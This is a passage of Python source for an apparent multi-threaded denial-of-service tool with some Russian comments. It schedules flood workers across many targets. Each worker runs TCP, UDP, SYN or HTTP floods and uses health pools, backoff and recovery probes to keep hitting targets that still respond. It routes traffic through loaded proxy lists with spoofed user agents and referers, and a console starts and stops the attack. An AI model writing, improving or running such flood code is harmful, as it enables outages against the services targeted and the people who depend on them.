        self, key: str, snapshot: Dict[str, Dict[str, object]]
    ) -> int:
        entry = snapshot.get(key, {})
        return int(entry.get("consecutive_failures", 0))

    def _is_currently_healthy(
        self,
        key: str,
        entry: Dict[str, object],
        snapshot: Dict[str, Dict[str, object]],
    ) -> bool:
        if int(entry.get("successes", 0)) <= 0:
            return False
        streak = self._consecutive_failure_streak(key, snapshot)
        if streak < self.HEALTHY_DEMOTION_STREAK:
            return True
        kind = str(entry.get("last_error_kind", ERROR_KIND_UNKNOWN))
        return kind not in HARD_COOLDOWN_KINDS

    def _pool_for_entry(
        self,
        key: str,
        entry: Dict[str, object],
        now: float,
        in_backoff: bool,
    ) -> int:
        successes = int(entry.get("successes", 0))
        attempts = int(entry.get("attempts", 0))
        kind = str(entry.get("last_error_kind", ERROR_KIND_UNKNOWN))

        if successes > 0 and self._is_currently_healthy(
            key, entry, {key: entry}
        ):
            return self.POOL_HEALTHY
        if attempts < DISCOVERY_ATTEMPTS_PER_TARGET:
            return self.POOL_DISCOVERY
        if in_backoff:
            if kind in HARD_COOLDOWN_KINDS:
                return self.POOL_COOLDOWN_PROBE
            return self.POOL_COOLDOWN_PROBE
        if kind in HARD_COOLDOWN_KINDS:
            return self.POOL_COOLDOWN_PROBE
        if kind in (ERROR_KIND_TIMEOUT, ERROR_KIND_ROUTE, ERROR_KIND_TLS_HTTP, ERROR_KIND_UNKNOWN):
            return self.POOL_DEGRADED
        return self.POOL_DEGRADED

    def summarize_pools(self, snapshot: Dict[str, Dict[str, object]], now: float) -> Dict[str, int]:
        counts = {"healthy": 0, "discovery": 0, "degraded": 0, "closed": 0, "cooldown": 0}
        for job in self.jobs:
            key = job.target_key
            entry = snapshot.get(key, {})
            in_backoff = self._backoff_until.get(key, 0) > now
            pool = self._pool_for_entry(key, entry, now, in_backoff)
            kind = str(entry.get("last_error_kind", ERROR_KIND_UNKNOWN))
            if pool == self.POOL_HEALTHY:
                counts["healthy"] += 1
            elif pool == self.POOL_DISCOVERY:
                counts["discovery"] += 1
            elif pool == self.POOL_COOLDOWN_PROBE and in_backoff:
                if kind in (ERROR_KIND_REFUSED, ERROR_KIND_DNS):
                    counts["closed"] += 1
                else:
                    counts["cooldown"] += 1
            elif kind in HARD_COOLDOWN_KINDS:
                counts["closed"] += 1
            elif pool == self.POOL_DEGRADED:
                counts["degraded"] += 1
            else:
                counts["cooldown"] += 1
        return counts

    def count_ready(self, snapshot: Dict[str, Dict[str, object]], now: float) -> int:
        ready = 0
        for job in self.jobs:
            if self._backoff_until.get(job.target_key, 0) <= now:
                ready += 1
        return ready

    def derive_diagnosis(
        self,
        pools: Dict[str, int],
        *,
        proxy_mode: str,
        useful_bytes: int,
        ready_count: int,
    ) -> str:
        total = len(self.jobs)
        if total == 0:
            return "no_targets"
        if pools["healthy"] > 0 and useful_bytes > 0:
            return "healthy"
        if pools["healthy"] == 0 and pools["closed"] >= max(1, total // 2):
            return "targets_mostly_closed"
        if proxy_mode == "proxy" and pools["healthy"] == 0 and pools["cooldown"] + pools["closed"] > 0:
            return "proxy_failure"
        if pools["degraded"] + pools["discovery"] > pools["closed"] and pools["healthy"] == 0:
            return "egress_blocked"
        if ready_count == 0:
            return "capacity_idle"
        if pools["healthy"] > 0 and useful_bytes == 0:
            return "insufficient_reachable"
        return "low_traffic_mixed"

    def pick_next(self) -> Optional[TargetJob]:
        now = time.time()
        snapshot = self.target_health.snapshot()
        self._pick_counter += 1
        # Reserve probe turns so small thread budgets do not hammer closed/backoff targets every pick.
        probe_budget = max(10, self.worker_count // 5)
        allow_probe = (self._pick_counter % probe_budget) == 0
        allow_discovery = (self._pick_counter % 3) == 0
        recovery_probe_budget = max(12, self.worker_count * 2)
        allow_recovery_probe = (self._pick_counter % recovery_probe_budget) == 0

        with self._lock:
            buckets: Dict[int, List[TargetJob]] = {
                self.POOL_HEALTHY: [],
                self.POOL_DISCOVERY: [],
                self.POOL_DEGRADED: [],
                self.POOL_COOLDOWN_PROBE: [],
            }
            for job in self.jobs:
                key = job.target_key
                backoff_until = self._backoff_until.get(key, 0)
                in_backoff = backoff_until > now
                if in_backoff and not allow_probe:
                    continue
                entry = snapshot.get(key, {})
                pool = self._pool_for_entry(key, entry, now, in_backoff)
                if pool == self.POOL_COOLDOWN_PROBE and in_backoff and not allow_probe:
                    continue
                buckets[pool].append(job)

            discovery = buckets.get(self.POOL_DISCOVERY) or []
            if discovery and (allow_discovery or not buckets.get(self.POOL_HEALTHY)):
                return self._pick_round_robin(discovery)

            if allow_recovery_probe:
                recovery_candidates: List[TargetJob] = []
                for job in self.jobs:
                    key = job.target_key
                    entry = snapshot.get(key, {})
                    kind = str(entry.get("last_error_kind", ERROR_KIND_UNKNOWN))
                    if kind not in HARD_COOLDOWN_KINDS:
                        continue
                    successes = int(entry.get("successes", 0))
                    attempts = int(entry.get("attempts", 0))
                    if successes > 0:
                        if self._is_currently_healthy(key, entry, snapshot):
                            continue
                    elif attempts < DISCOVERY_ATTEMPTS_PER_TARGET:
                        continue
                    recovery_candidates.append(job)
                if recovery_candidates:
                    return self._pick_round_robin(recovery_candidates, probe=True)

            for pool_rank in (
                self.POOL_HEALTHY,
                self.POOL_DEGRADED,
                self.POOL_DISCOVERY,
                self.POOL_COOLDOWN_PROBE,
            ):
                group = buckets.get(pool_rank) or []
                if not group:
                    continue
                if pool_rank == self.POOL_COOLDOWN_PROBE:
                    job = self._pick_round_robin(group, probe=True)
                else:
                    job = self._pick_round_robin(group)
                return job
            return None

    def _backoff_delay(self, key: str, snapshot: Dict[str, Dict[str, object]], streak: int) -> float:
        entry = snapshot.get(key, {})
        kind = str(entry.get("last_error_kind", ERROR_KIND_UNKNOWN))
        if kind in HARD_COOLDOWN_KINDS:
            exponent = min(max(0, streak - self.HARD_BACKOFF_AFTER_ATTEMPTS), 3)
            return min(
                self.HARD_BACKOFF_MAX_SEC,
                self.HARD_BACKOFF_BASE_SEC * (2 ** exponent),
            )
        exponent = min(max(0, streak - self.BACKOFF_AFTER_ATTEMPTS), 4)
        return min(self.BACKOFF_MAX_SEC, self.BACKOFF_BASE_SEC * (2 ** exponent))

    def note_result(self, job: TargetJob, had_success: bool) -> None:
        if had_success:
            with self._lock:
                self._backoff_until.pop(job.target_key, None)
            return

        snapshot = self.target_health.snapshot()
        streak = self._failure_streak(job.target_key, snapshot)
        entry = snapshot.get(job.target_key, {})
        kind = str(entry.get("last_error_kind", ERROR_KIND_UNKNOWN))
        threshold = (
            self.HARD_BACKOFF_AFTER_ATTEMPTS
            if kind in HARD_COOLDOWN_KINDS
            else self.BACKOFF_AFTER_ATTEMPTS
        )
        if streak < threshold:
            return

        delay = self._backoff_delay(job.target_key, snapshot, streak)
        with self._lock:
            self._backoff_until[job.target_key] = time.time() + delay


class FloodWorker(threading.Thread):
    def __init__(
        self,
        worker_id: int,
        scheduler: TargetScheduler,
        event: threading.Event,
        stats_dict: dict,
        stats_lock: threading.Lock,
        target_health: TargetHealth
    ):
        super().__init__(daemon=True)
        self.worker_id = worker_id
        self.scheduler = scheduler
        self.event = event
        self.stats_dict = stats_dict
        self.stats_lock = stats_lock
        self.target_health = target_health

    def _success_count(self, key: str) -> int:
        snapshot = self.target_health.snapshot()
        entry = snapshot.get(key, {})
        return int(entry.get("successes", 0))

    def _execute_job(self, job: TargetJob) -> None:
        if job.method in ("TCP", "UDP", "SYN"):
            layer4 = Layer4(
                job.layer4_addr,
                job.method,
                None,
                job.target_key,
                self.stats_dict,
                self.stats_lock,
                self.target_health,
                burst_limit=LAYER4_BURST_SENDS
            )
            layer4.select(job.method)
            layer4.SENT_FLOOD()
            return

        http = HttpFlood(
            self.worker_id,
            job.url,
            job.host,
            job.method,
            job.rpc,
            None,
            job.useragents,
            job.referers,
            job.proxies,
            job.target_key,
            self.stats_dict,
            self.stats_lock,
            self.target_health
        )
        http.select(job.method)
        http.SENT_FLOOD()

    def run(self):
        self.event.wait()
        while self.event.is_set():
            job = self.scheduler.pick_next()
            if job is None:
                time.sleep(0.05)
                continue

            before = self._success_count(job.target_key)
            self._execute_job(job)
            after = self._success_count(job.target_key)
            self.scheduler.note_result(job, after > before)

# ----------------------------------------------------------------------
# Менеджер атак
# ----------------------------------------------------------------------
class AttackManager:
    def __init__(self, config: dict, proxy_providers: list):
        self.config = config
        self.proxy_providers = proxy_providers
        self.event = threading.Event()
        self.threads: List[threading.Thread] = []
        self.monitor_thread = None
        self.health_thread = None
        self.capacity_thread = None
        self.worker_count = 0
        self.target_stats: Dict[str, List[int]] = {}
        self.stats_lock = threading.Lock()
        self.target_health = TargetHealth()
        self._proxy_list: Optional[List[Proxy]] = None
        self._proxies_loaded = False
        self.target_keys: List[str] = []
        self.resolved_targets: List[str] = []
        self.table_height = 0
        self.proxy_mode = "direct"
        self.scheduler: Optional[TargetScheduler] = None
        self.target_jobs: List[TargetJob] = []

    def _load_proxies_if_needed(self, proxy_enabled: int, check_url: str) -> Optional[List[Proxy]]:
        if proxy_enabled == 0:
            return None
        if not self._proxies_loaded:
            self._proxy_list = ProxyManager.get_proxies(self.proxy_providers, check_url)
            self._proxies_loaded = True
        return self._proxy_list

    def _build_target_jobs(self) -> Tuple[List[TargetJob], List[str], List[str], int]:
        jobs: List[TargetJob] = []
        target_keys: List[str] = []
        resolved_targets: List[str] = []

        settings = self.config.get("settings", {})
        worker_budget = max(1, min(int(settings.get("threads", 100)), MAX_WORKER_THREADS))
        default_rpc = settings.get("rpc", 1)
        default_proxy = settings.get("proxy", 0)
        self.proxy_mode = "proxy" if int(default_proxy) > 0 else "direct"

        ua_list = set(self.config.get("useragents", []))
        if not ua_list:
            ua_list = {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"}
        ref_list = set(self.config.get("referers", []))
        if not ref_list:
            ref_list = {"https://www.google.com/", "https://www.bing.com/"}

        for target in self.config.get("targets", []):
            method = target["method"].upper()
            target_str = target["target"]
            ip = target.get("ip")
            rpc = target.get("rpc", default_rpc)
            proxy_enabled = target.get("proxy", default_proxy)

            if method in ("TCP", "UDP", "SYN"):
                if "://" in target_str:
                    _, rest = target_str.split("://", 1)
                else:
                    rest = target_str
                if ":" in rest:
                    ip_part, port_part = rest.rsplit(":", 1)
                else:
                    ip_part, port_part = rest, "80"
                port = int(port_part)
                try:
                    actual_ip = ip if ip else socket.gethostbyname(ip_part)
                except socket.gaierror as exc:
                    logger.warning(
                        "Skipping unresolvable target %s: %s",
                        mask_target_label(target_str),
                        exc,
                    )
                    continue
                key = f"{actual_ip}:{port}"
                target_keys.append(key)
                resolved_targets.append(f"{method} {actual_ip}:{port}")
                jobs.append(TargetJob(
                    method=method,
                    target_key=key,
                    layer4_addr=(actual_ip, port),
                    useragents=ua_list,
                    referers=ref_list
                ))
            else:
                url = URL(target_str)
                hostname = url.host
                try:
                    actual_ip = ip if ip else socket.gethostbyname(hostname)
                except socket.gaierror as exc:
                    logger.warning(
                        "Skipping unresolvable target %s: %s",
                        mask_target_label(target_str),
                        exc,
                    )
                    continue
                port = url.port or (443 if url.scheme.lower() == "https" else 80)
                key = f"{hostname}:{port}"
                target_keys.append(key)
                resolved_targets.append(f"{method} {hostname}:{port}")
                proxies = self._load_proxies_if_needed(proxy_enabled, str(url))
                jobs.append(TargetJob(
                    method=method,
                    target_key=key,
                    url=url,
                    host=actual_ip,
                    rpc=rpc,
                    proxies=set(proxies) if proxies else None,
                    useragents=ua_list,
                    referers=ref_list
                ))

        seen = set()
        unique_keys: List[str] = []
        for key in target_keys:
            if key not in seen:
                seen.add(key)
                unique_keys.append(key)

        return jobs, unique_keys, resolved_targets, worker_budget

    def _spawn_workers(self, jobs: List[TargetJob], worker_budget: int) -> None:
        self.threads.clear()
        if not jobs:
            return

        self.target_jobs = jobs
        worker_count = max(1, min(worker_budget, MAX_WORKER_THREADS))
        self.worker_count = worker_count
        self.scheduler = TargetScheduler(jobs, self.target_health, worker_count)

        for worker_id in range(worker_count):
            worker = FloodWorker(
                worker_id,
                self.scheduler,
                self.event,
                self.target_stats,
                self.stats_lock,
                self.target_health
            )
            self.threads.append(worker)

    def _calculate_table_height(self):
        try:
            term_height = os.get_terminal_size().lines
        except (ValueError, OSError):
            term_height = 24
        needed = len(self.target_keys) + 4
        max_table = max(5, min(needed, term_height - 2))
        return max_table

    def start(self):
        if self.event.is_set():
            logger.warning("Already running")
            return

        jobs, self.target_keys, self.resolved_targets, worker_budget = self._build_target_jobs()
        self._spawn_workers(jobs, worker_budget)
        if not self.threads:
            logger.warning("No resolvable targets to launch.")
            return

        self.table_height = self._calculate_table_height()

        sys.stdout.write("\033[2J\033[H")
        for _ in range(self.table_height):
            print()
        print("Type start/stop/exit")

        with self.stats_lock:
            self.target_stats.clear()

        if self.proxy_mode == "proxy" and not self._proxies_loaded:
            probe_url = "http://httpbin.org/get"
            for target in self.config.get("targets", []):
                method = str(target.get("method", "")).upper()
                if method not in ("TCP", "UDP", "SYN"):
                    probe_url = str(target.get("target", probe_url))
                    break
            self._load_proxies_if_needed(1, probe_url)

        for resolved in self.resolved_targets:
            logger.info("Resolved target %s", mask_target_label(resolved))

        if self.proxy_mode == "direct":
            logger.info(
                "Connectivity mode: direct (proxy disabled). "
                "If targets time out, enable proxy/VPN or check firewall/routing."
            )
        else:
            if self._proxy_list:
                logger.info("Connectivity mode: proxy enabled (%s working proxies loaded)", len(self._proxy_list))
            elif self._proxies_loaded:
                logger.warning(
                    "Connectivity mode: proxy enabled but no working proxies loaded; "
                    "proxy pool exhausted — stop/start module to refresh or check network route"
                )
            else:
                logger.info("Connectivity mode: proxy enabled (loading proxy providers...)")

        logger.info(
            "Launching %s worker threads for %s targets (global budget=%s)...",
            len(self.threads),
            len(jobs),
            worker_budget
        )
        for t in self.threads:
            t.start()
        self.event.set()

        if self.monitor_thread and self.monitor_thread.is_alive():
            self.monitor_thread.join(timeout=0.5)
        self.monitor_thread = threading.Thread(
            target=monitor_loop,
            args=(self.event, self.target_stats, self.stats_lock, self.target_keys, self.table_height),
            daemon=True
        )
        self.monitor_thread.start()

        if self.health_thread and self.health_thread.is_alive():
            self.health_thread.join(timeout=0.5)
        self.health_thread = threading.Thread(
            target=health_watchdog_loop,
            args=(self.event, self.target_health, self.target_keys, self.proxy_mode),
            daemon=True
        )
        self.health_thread.start()

        if self.capacity_thread and self.capacity_thread.is_alive():
            self.capacity_thread.join(timeout=0.5)
        self.capacity_thread = threading.Thread(
            target=capacity_health_loop,
            args=(
                self.event,
                self.target_health,
                self.target_keys,
                self.target_stats,
                self.stats_lock,
                self.scheduler,
                self.worker_count,
                self.proxy_mode,
            ),
            daemon=True,
        )
        self.capacity_thread.start()

    def stop(self):
        if not self.event.is_set():
            logger.warning("Attack not running.")
            return
        self.event.clear()
        time.sleep(0.2)
        logger.info("Attack stopped.")

# ----------------------------------------------------------------------
# Консоль
# ----------------------------------------------------------------------
def console(manager: AttackManager):
    manager.start()

    while True:
        prompt_row = manager.table_height + 1
        sys.stdout.write(f"\033[{prompt_row};1H\033[K")
        sys.stdout.flush()
        try:
            cmd = input("BaseTool> ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            cmd = "exit"

        if cmd == "start":
            if not manager.event.is_set():
                manager.start()
            else:
                print("Already running.")
        elif cmd == "stop":
            manager.stop()
        elif cmd in ("exit", "quit"):
            if manager.event.is_set():
                manager.stop()
            break
        elif cmd:
            print("Unknown command. Available: start, stop, exit")

# ----------------------------------------------------------------------
# Main
# ----------------------------------------------------------------------
def resolve_runtime_dir() -> Path:
    if getattr(sys, "frozen", False):
        return Path.cwd()
    return Path(__file__).resolve().parent

def main():
    base_dir = resolve_runtime_dir()
    config_path = base_dir / "config.json"
    proxy_path = base_dir / "proxy.json"

    if not config_path.exists():
        print("Error: config.json not found")
        sys.exit(1)
    if not proxy_path.exists():
        print("Error: proxy.json not found")
        sys.exit(1)

    config = load_json_safe(config_path)
    proxy_providers = load_json_safe(proxy_path)

    mgr = AttackManager(config, proxy_providers)
    console(mgr)

if __name__ == "__main__":
    main()
